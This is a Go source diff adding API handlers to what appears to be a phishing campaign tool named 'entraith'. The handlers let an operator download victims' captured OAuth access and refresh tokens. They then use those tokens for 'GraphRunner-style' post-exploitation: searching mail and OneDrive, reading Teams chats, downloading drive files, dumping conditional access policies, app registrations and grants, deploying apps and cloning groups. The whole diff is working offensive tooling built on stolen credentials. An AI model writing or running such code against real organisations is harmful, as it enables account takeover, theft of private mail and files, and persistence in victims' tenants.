@@ -1,6 +1,7 @@
 package api
 
 import (
+	"context"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
@@ -11,6 +12,7 @@ import (
 
 	"github.com/bl4cksku11/entraith/internal/campaigns"
 	"github.com/bl4cksku11/entraith/internal/mailer"
+	"github.com/bl4cksku11/entraith/internal/modules/graph"
 	"github.com/bl4cksku11/entraith/internal/targets"
 )
 
@@ -43,6 +45,31 @@ func (h *Handler) Routes() http.Handler {
 	// Email sending
 	mux.HandleFunc("POST /api/campaigns/{id}/send-emails", h.sendEmails)
 	mux.HandleFunc("GET /api/campaigns/{id}/email-results", h.getEmailResults)
+
+	// Per-target token operations
+	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/refresh", h.refreshToken)
+	mux.HandleFunc("GET /api/campaigns/{id}/tokens/{targetId}/access-token", h.downloadAccessToken)
+	mux.HandleFunc("GET /api/campaigns/{id}/tokens/{targetId}/refresh-token", h.downloadRefreshToken)
+
+	// Graph API post-exploitation (GraphRunner-style)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/emails", h.graphSearchEmails)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/files", h.graphSearchFiles)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/teams", h.graphGetTeams)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/chats", h.graphGetChats)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/deploy-app", h.graphDeployApp)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mailboxes", h.graphDiscoverMailboxes)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups", h.graphGetGroups)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/owned-groups", h.graphGetOwnedGroups)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/clone-group", h.graphCloneGroup)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/users", h.graphSearchUsers)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/conditional-access", h.graphDumpConditionalAccess)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/apps", h.graphDumpApps)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/grants", h.graphGetGrants)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/me", h.graphGetMe)
+
+	// Drive filesystem navigation
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/ls", h.graphDriveLs)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/download", h.graphDriveDownload)
 
 	// Export & delete
 	mux.HandleFunc("GET /api/campaigns/{id}/export", h.exportCampaign)
@@ -358,6 +385,394 @@ func (h *Handler) deleteTemplate(w http.ResponseWriter, r *http.Request) {
 	}
 	h.Mailer.DeleteTemplate(id)
 	writeJSON(w, 200, map[string]string{"status": "deleted"})
+}
+
+// --- Per-target token handlers ---
+
+func (h *Handler) refreshToken(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	refreshed, err := h.Manager.RefreshToken(id, targetID)
+	if err != nil {
+		writeError(w, 400, err.Error())
+		return
+	}
+	writeJSON(w, 200, refreshed)
+}
+
+func (h *Handler) downloadAccessToken(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	token, err := h.Manager.GetTokenByTargetID(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	filename := fmt.Sprintf("at_%s.txt", sanitizeFilename(token.TargetEmail))
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
+	w.Write([]byte(token.AccessToken))
+}
+
+func (h *Handler) downloadRefreshToken(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	token, err := h.Manager.GetTokenByTargetID(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	if token.RefreshToken == "" {
+		writeError(w, 404, "no refresh token available")
+		return
+	}
+	filename := fmt.Sprintf("rt_%s.txt", sanitizeFilename(token.TargetEmail))
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
+	w.Write([]byte(token.RefreshToken))
+}
+
+// --- Graph API handlers ---
+
+func (h *Handler) graphClient(campaignID, targetID string) (*graph.Client, error) {
+	token, err := h.Manager.GetTokenByTargetID(campaignID, targetID)
+	if err != nil {
+		return nil, err
+	}
+	return graph.New(token.AccessToken), nil
+}
+
+func (h *Handler) graphSearchEmails(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	var body struct {
+		Query string `json:"query"`
+		Top   int    `json:"top"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.Query == "" {
+		body.Query = "*"
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.SearchEmails(context.Background(), body.Query, body.Top)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphSearchFiles(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	var body struct {
+		Query string `json:"query"`
+		Top   int    `json:"top"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.Query == "" {
+		body.Query = "*"
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.SearchOneDrive(context.Background(), body.Query, body.Top)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphGetTeams(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetJoinedTeams(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphGetChats(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetTeamsChats(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDeployApp(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	var body struct {
+		DisplayName     string   `json:"display_name"`
+		RedirectURI     string   `json:"redirect_uri"`
+		RequestedScopes []string `json:"requested_scopes"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.DisplayName == "" {
+		writeError(w, 400, "display_name required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.DeployApp(context.Background(), body.DisplayName, body.RedirectURI, body.RequestedScopes)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDiscoverMailboxes(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.DiscoverUsers(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphGetGroups(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetGroups(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphGetOwnedGroups(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetOwnedGroups(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphCloneGroup(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	var body struct {
+		SourceGroupID  string `json:"source_group_id"`
+		NewDisplayName string `json:"new_display_name"`
+		Description    string `json:"description"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.SourceGroupID == "" || body.NewDisplayName == "" {
+		writeError(w, 400, "source_group_id and new_display_name required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.CloneGroup(context.Background(), body.SourceGroupID, body.NewDisplayName, body.Description)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphSearchUsers(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	var body struct {
+		Query string `json:"query"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.Query == "" {
+		writeError(w, 400, "query required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.SearchUserAttributes(context.Background(), body.Query)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDumpConditionalAccess(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.DumpConditionalAccessPolicies(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDumpApps(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	apps, err := gc.DumpAppRegistrations(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	sps, _ := gc.DumpServicePrincipals(context.Background())
+	if sps == nil {
+		sps = json.RawMessage(`{"value":[]}`)
+	}
+	combined := map[string]json.RawMessage{
+		"app_registrations":  apps,
+		"service_principals": sps,
+	}
+	data, err := json.Marshal(combined)
+	if err != nil {
+		writeError(w, 500, "failed to marshal response")
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(data)
+}
+
+func (h *Handler) graphGetGrants(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetOAuth2PermissionGrants(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDriveLs(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	itemID := r.URL.Query().Get("item") // empty = root
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.ListDriveFolder(context.Background(), itemID, 200)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphDriveDownload(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	itemID := r.URL.Query().Get("item")
+	filename := r.URL.Query().Get("name")
+	if itemID == "" {
+		writeError(w, 400, "item parameter required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	body, contentDisp, err := gc.DownloadDriveItem(context.Background(), itemID)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	defer body.Close()
+
+	if contentDisp != "" {
+		w.Header().Set("Content-Disposition", contentDisp)
+	} else if filename != "" {
+		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, sanitizeFilename(filename)))
+	} else {
+		w.Header().Set("Content-Disposition", `attachment; filename="download"`)
+	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	io.Copy(w, body)
+}
+
+func (h *Handler) graphGetMe(w http.ResponseWriter, r *http.Request) {
+	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.GetCurrentUser(context.Background())
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func sanitizeFilename(s string) string {
+	replacer := strings.NewReplacer(
+		"@", "_at_", "/", "_", "\\", "_", ":", "_", "*", "_",
+		"?", "_", "\"", "_", "<", "_", ">", "_", "|", "_",
+	)
+	return replacer.Replace(s)
 }
 
 // --- Export / Delete ---
